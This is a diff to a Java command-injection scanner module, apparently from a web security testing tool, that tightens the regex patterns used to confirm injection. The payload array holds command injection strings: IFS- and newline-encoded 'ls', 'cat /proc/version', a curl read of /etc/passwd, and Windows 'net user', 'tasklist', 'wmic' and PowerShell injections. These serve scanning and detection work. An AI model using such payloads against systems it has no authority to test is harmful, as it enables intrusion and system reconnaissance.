@@ -158,7 +158,7 @@ public class CommandInjectionScanner implements ScanModule {
             {";ls${IFS}-la${IFS}/;", "REGEX:[d-][rwx-]{9}\\s+\\d+\\s+\\w+\\s+\\w+", "ls -la / via IFS (Unix)"},
             {"%0als -la /%0a", "REGEX:[d-][rwx-]{9}\\s+\\d+\\s+\\w+\\s+\\w+", "ls -la / newline (Unix)"},
             // cat /proc/version — specific kernel version string
-            {";cat /proc/version;", "Linux version", "/proc/version (Unix)"},
+            {";cat /proc/version;", "REGEX:Linux version \\d+\\.\\d+\\.\\d+", "/proc/version (Unix)"},
             // Curl-based output
             {"|curl -s file:///etc/passwd", "root:x:0:0:", "curl file proto (Unix)"},
     };
@@ -179,13 +179,13 @@ public class CommandInjectionScanner implements ScanModule {
             // dir — require Volume in drive pattern
             {"& dir C:\\ &", "REGEX:Volume in drive [A-Z]", "dir C: (Windows)"},
             // net user — require user accounts listing header
-            {"& net user &", "REGEX:User accounts for", "net user (Windows)"},
+            {"& net user &", "REGEX:(?s)User accounts for.*?-{10,}", "net user (Windows)"},
             // tasklist — require full tasklist format: Image Name, PID, Session Name, Session#, Mem Usage
             {"& tasklist &", "REGEX:\\w+\\.exe\\s+\\d+\\s+\\w+\\s+\\d+\\s+[\\d,]+ K", "tasklist (Windows)"},
             // wmic — require Windows with version number
-            {"& wmic os get caption &", "REGEX:Microsoft Windows\\s+(?:Server\\s+)?\\d+", "wmic os (Windows)"},
+            {"& wmic os get caption &", "REGEX:Caption\\s*\\r?\\nMicrosoft Windows", "wmic os (Windows)"},
             // PowerShell expressions
-            {"& powershell -c \"[System.Environment]::OSVersion\" &", "REGEX:Microsoft Windows NT \\d+\\.\\d+", "powershell OSVersion (Windows)"},
+            {"& powershell -c \"[System.Environment]::OSVersion\" &", "REGEX:(?:OSVersion|Version).*Microsoft Windows NT \\d+\\.\\d+", "powershell OSVersion (Windows)"},
     };
 
     // OOB payloads using Collaborator (COLLAB_PLACEHOLDER replaced at runtime)
